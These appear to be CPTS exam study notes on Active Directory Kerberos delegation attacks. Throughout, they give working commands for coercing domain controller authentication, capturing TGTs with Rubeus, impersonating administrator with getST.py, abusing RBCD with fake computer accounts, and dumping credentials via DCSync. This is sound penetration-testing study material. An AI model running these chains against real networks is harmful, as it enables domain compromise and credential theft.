# RBCD & UCD

[methods](RBCD%20&%20UCD/methods.md)

# Active Directory — Kerberos Delegation Attacks

### CPTS Exam Study Notes

---

## Table of Contents

1. [Delegation Types Overview](#1-delegation-types-overview)
2. [Unconstrained Delegation](#2-unconstrained-delegation)
3. [Constrained Delegation](#3-constrained-delegation)
4. [Resource-Based Constrained Delegation (RBCD)](#4-resource-based-constrained-delegation-rbcd)
5. [SeEnableDelegationPrivilege Abuse](#5-seenabledelegationprivilege-abuse)
6. [Quick-Reference](#6-quick-reference)

---

## 1. Delegation Types Overview

| Type | Flag Set | Who Configures | Scope |
| --- | --- | --- | --- |
| Unconstrained | `TRUSTED_FOR_DELEGATION` on userAccountControl | User with `SeEnableDelegationPrivilege` | Any service on any host |
| Constrained | `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` + `msDS-AllowedToDelegateTo` | User with `SeEnableDelegationPrivilege` | Specific SPNs only |
| RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` on target computer | Owner/GenericWrite on target computer object | Controlled by target |

### Key Difference

```
Unconstrained  → target machine stores TGTs → steal TGT of any connecting user
Constrained    → machine can impersonate users TO specific services
RBCD           → target machine controls WHO can delegate to IT
               → SeEnableDelegationPrivilege NOT required
```

---

## 2. Unconstrained Delegation

### How It Works

```
User connects to Machine A (unconstrained delegation)
        ↓
Machine A receives and STORES user's TGT
        ↓
Machine A can now authenticate AS that user to ANY service
        ↓
If a DC authenticates to Machine A → steal DC's TGT → DCSync
```

### Enumeration

```powershell
# Find computers with unconstrained delegation
Get-DomainComputer -Unconstrained | select name, dnshostname

# PowerView
Get-ADComputer -Filter {TrustedForDelegation -eq $True} | select name

# CrackMapExec
crackmapexec ldap DC_IP -u user -p pass --trusted-for-delegation

##
PowerMad = Machine account abuse & AD object creation
```

### Requirements

- Must **compromise** the machine with unconstrained delegation
- Need to **coerce DC authentication** to that machine

### Attack Flow

**Step 1 — Compromise the unconstrained delegation host**

**Step 2 — Monitor for incoming TGTs (Rubeus)**

```powershell
# On the compromised host — monitor for TGTs
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$
```

**Step 3 — Coerce DC to authenticate (from attack box)**

```bash
# PrinterBug (MS-RPRN)
.\SpoolSample.exe DC_IP UNCONSTRAINED_HOST_IP

# PetitPotam (MS-EFSRPC)
python3 PetitPotam.py UNCONSTRAINED_HOST_IP DC_IP

# Coercer (multi-protocol)
python3 Coercer.py coerce -u user -p pass -d domain.com \
  -l UNCONSTRAINED_HOST_IP -t DC_IP
```

**Step 4 — Capture DC TGT (Rubeus)**

```powershell
# Rubeus captures the DC machine account TGT
# Copy the base64 ticket

# Import the ticket
.\Rubeus.exe ptt /ticket:BASE64_TICKET

# Now perform DCSync
.\mimikatz.exe "lsadump::dcsync /domain:domain.com /user:administrator" exit
```

**Step 5 — DCSync from Linux**

```bash
# Export ticket and use secretsdump
export KRB5CCNAME=dc_machine.ccache
secretsdump.py -k -no-pass DC.domain.com
```

---

## 3. Constrained Delegation

### How It Works

```
Service Account / Computer has specific SPNs it can delegate to
        ↓
S4U2Self  → get TGS on behalf of any user TO itself
        ↓
S4U2Proxy → use that TGS to get ticket TO the allowed SPN
        ↓
Result: impersonate any user to the configured service
```

### Enumeration

```powershell
# Find accounts with constrained delegation
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto

# LDAP query
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} \
  -Properties msDS-AllowedToDelegateTo | select name, msDS-AllowedToDelegateTo

# CrackMapExec
crackmapexec ldap DC_IP -u user -p pass --trusted-for-delegation
```

### Attack Flow (Have Account Hash/Password)

**Step 1 — Request service ticket impersonating Administrator**

```bash
# Using getST.py (Impacket)
getST.py domain.com/svcaccount:Password \
  -spn cifs/TARGET.domain.com \
  -impersonate administrator

# With hash instead of password
getST.py domain.com/svcaccount \
  -hashes :NTHASH \
  -spn cifs/TARGET.domain.com \
  -impersonate administrator
```

**Step 2 — Use the ticket**

```bash
export KRB5CCNAME=administrator@cifs_TARGET.domain.com@DOMAIN.COM.ccache
psexec.py -k -no-pass administrator@TARGET.domain.com
wmiexec.py -k -no-pass administrator@TARGET.domain.com
secretsdump.py -k -no-pass TARGET.domain.com
```

### Case Study — Constrained Delegation to LDAP → DCSync

```bash
# Configure constrained delegation on a computer object (if SeEnableDelegationPrivilege)
Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=domain,DC=com" \
  -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.domain.com"}

# Change computer account password (if have rights)
netexec smb DC_IP -u user -p pass -M change-password \
  -o USER='FS01$' NEWPASS=NewPass123!

# Request LDAP service ticket as DC machine account
getST.py 'domain.com/FS01$:NewPass123!' \
  -spn ldap/dc.domain.com \
  -impersonate dc

# DCSync using LDAP ticket
KRB5CCNAME=dc@ldap_dc.domain.com@DOMAIN.ccache \
  secretsdump.py -k -no-pass dc.domain.com
```

---

## 4. Resource-Based Constrained Delegation (RBCD)

### How It Works

```
Target computer controls WHO can delegate to it
via msDS-AllowedToActOnBehalfOfOtherIdentity attribute
        ↓
If you can WRITE to a computer object → set RBCD
        ↓
You need a computer account you control (or create one)
        ↓
S4U2Self + S4U2Proxy → impersonate any user to that computer
        ↓
SYSTEM on target
```

### Requirements

```
1. GenericWrite / GenericAll / WriteDACL on TARGET computer object
   OR ownership of TARGET computer object
2. A computer account you control (create via MachineAccountQuota or already own one)
3. SeEnableDelegationPrivilege NOT needed
```

### Attack Flow

**Step 1 — Check MachineAccountQuota**

```bash
netexec ldap DC_IP -u user -p pass -M maq
# MachineAccountQuota: 10  ← can create computer accounts
# MachineAccountQuota: 0   ← cannot, need to own existing computer
```

**Step 2 — Create a fake computer account**

```bash
addcomputer.py domain.com/user:pass \
  -computer-name 'FAKE$' \
  -computer-pass '<COMPUTER_PASSWORD>'
```

**Step 3 — Set RBCD on target (write msDS-AllowedToActOnBehalfOfOtherIdentity)**

```bash
# Python
rbcd.py -delegate-from 'FAKE$' \
  -delegate-to 'TARGET$' \
  -action write \
  domain.com/user:pass

# PowerShell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor \
  -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...FAKE-SID)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-ADComputer TARGET | Set-ADComputer \
  -Add @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$SDBytes}
```

**Step 4 — Request service ticket**

```bash
getST.py domain.com/'FAKE$:FakePass123!' \
  -spn cifs/TARGET.domain.com \
  -impersonate administrator

export KRB5CCNAME=administrator@cifs_TARGET.domain.com@DOMAIN.ccache
```

**Step 5 — Access target**

```bash
psexec.py -k -no-pass administrator@TARGET.domain.com
wmiexec.py -k -no-pass administrator@TARGET.domain.com
secretsdump.py -k -no-pass TARGET.domain.com
```

---

## 5. SeEnableDelegationPrivilege Abuse

### What It Allows

A user with this privilege can:

- Set `TRUSTED_FOR_DELEGATION` flag → configure unconstrained delegation
- Set `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag → configure constrained delegation
- Modify `msDS-AllowedToDelegateTo` → set delegation targets

> ⚠️ This is a highly sensitive privilege — only Domain Admins and similar have it by default.
> 

### Check for the Privilege

```powershell
whoami /priv | findstr /i "delegation"
# SeEnableDelegationPrivilege  Enabled ← abusable
```

### Attack Strategy with SeEnableDelegationPrivilege

```
Have SeEnableDelegationPrivilege + GenericAll on computer account?
        │
        ├── MachineAccountQuota > 0?
        │       └── Create computer → set unconstrained delegation → coerce DC → steal TGT → DCSync
        │
        └── MachineAccountQuota = 0 + own a computer account?
                └── Configure CONSTRAINED delegation on that computer
                    → Set msDS-AllowedToDelegateTo = ldap/DC
                    → Change computer password
                    → getST.py impersonate DC
                    → secretsdump via LDAP ticket → DCSync
```

---

## 6. Quick-Reference

### Decision Tree — Which Delegation Attack?

```
Found delegation misconfiguration?
        │
        ├── Unconstrained delegation on host?
        │       └── Compromise host → Rubeus monitor → coerce DC → steal TGT → DCSync
        │
        ├── Constrained delegation (TRUSTED_TO_AUTH)?
        │       └── Have account creds/hash → getST.py -impersonate administrator → psexec
        │
        ├── GenericWrite on computer object?
        │       └── RBCD attack → addcomputer → rbcd.py → getST.py → psexec
        │
        └── SeEnableDelegationPrivilege?
                └── Configure constrained delegation manually → getST.py → DCSync
```

### Key Commands Cheat Sheet

```bash
# Enumerate all delegation types
Get-DomainComputer -Unconstrained | select name
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto

# Create fake computer (RBCD)
addcomputer.py domain.com/user:<PASSWORD> -computer-name 'FAKE$' -computer-pass '<COMPUTER_PASSWORD>'

# Set RBCD
rbcd.py -delegate-from 'FAKE$' -delegate-to 'TARGET$' -action write domain.com/user:pass

# Request ticket (constrained / RBCD)
getST.py domain.com/account:pass -spn SERVICE/TARGET -impersonate administrator

# Use ticket
export KRB5CCNAME=administrator@SERVICE_TARGET@DOMAIN.ccache
psexec.py -k -no-pass administrator@TARGET.domain.com
secretsdump.py -k -no-pass TARGET.domain.com

# Coerce DC authentication (unconstrained)
python3 PetitPotam.py LISTENER_IP DC_IP
python3 Coercer.py coerce -u user -p pass -d domain.com -l LISTENER_IP -t DC_IP

# Monitor for TGTs (unconstrained — on compromised host)
.\Rubeus.exe monitor /interval:5 /filteruser:DC01$
```

### Key Things To Remember

- **Unconstrained** = TGTs stored on machine → need to physically compromise the machine first
- **Constrained** = specific SPNs only → need account credentials/hash to exploit
- **RBCD** = configured by target computer owner → need `GenericWrite` on target computer object
- `SeEnableDelegationPrivilege` enables unconstrained AND constrained delegation setup — not RBCD
- Constrained delegation to **LDAP** service on DC = DCSync via ticket
- If `MachineAccountQuota = 0` → can't create computer accounts → need to own an existing one
- Always check `MachineAccountQuota` before planning unconstrained delegation attack
- S4U2Self + S4U2Proxy is the Kerberos extension that makes constrained/RBCD impersonation work
- Golden rule: **impersonate `administrator`** or **`DC machine account`** for maximum impact

---

> 💡 **CPTS Exam Tip:** BloodHound will highlight all delegation misconfigurations automatically. Look for nodes marked "Unconstrained Delegation", "Allowed to Delegate", and edges like "GenericWrite" on computer objects. The case study in this module (SeEnableDelegationPrivilege + GenericAll on computer → constrained delegation to LDAP → DCSync) is a common HTB chain.
>